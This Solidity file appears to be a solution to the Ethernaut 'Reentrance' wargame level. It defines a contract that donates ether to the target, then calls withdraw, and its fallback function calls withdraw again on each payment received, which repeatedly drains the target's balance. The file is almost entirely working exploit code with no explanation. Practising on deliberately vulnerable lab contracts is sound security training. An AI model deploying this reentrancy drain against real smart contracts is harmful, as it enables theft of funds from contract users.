//SPDX-License-Identifier: None

pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external returns (uint);
    function withdraw(uint _amount) external;
}

contract Reenter {
    Reentrance reentrance;
    uint amount = 500000000000000;

    constructor(address $your_ethernaut_instance_here) payable {
        reentrance = Reentrance($your_ethernaut_instance_here);
    }

    function give() public {
        address to =  address(this);
        reentrance.donate{ value: amount }(to);
    }

    function steal() public {
        reentrance.withdraw( amount );
    }
    
    fallback() external payable {
        reentrance.withdraw( amount );
    }
}